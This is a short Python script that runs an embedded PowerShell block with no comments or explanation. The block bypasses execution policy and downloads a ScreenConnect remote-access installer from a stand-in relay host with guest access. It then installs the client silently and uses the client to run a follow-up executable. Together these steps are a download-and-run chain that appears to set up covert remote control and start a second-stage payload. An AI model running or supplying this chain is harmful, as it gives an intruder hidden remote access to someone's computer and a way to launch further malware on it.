import subprocess

script = r'''
Set-ExecutionPolicy Bypass -Scope Process -Force
$InstallerURL = "https://relay.example.invalid/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$DownloadPath = "C:\Windows\Temp\ClientSetup.msi"
Invoke-WebRequest -Uri $InstallerURL -OutFile $DownloadPath
msiexec.exe /i C:\Windows\Temp\ClientSetup.msi /qn
& "C:\Program Files (x86)\ScreenConnect Client\ScreenConnect.WindowsClient.exe" "RunFile" "C:\Users\analyst\OneDrive\Documents\ScreenConnect\Temp\followup.exe"
'''
subprocess.run(["powershell.exe", "-Command", script], check=True)
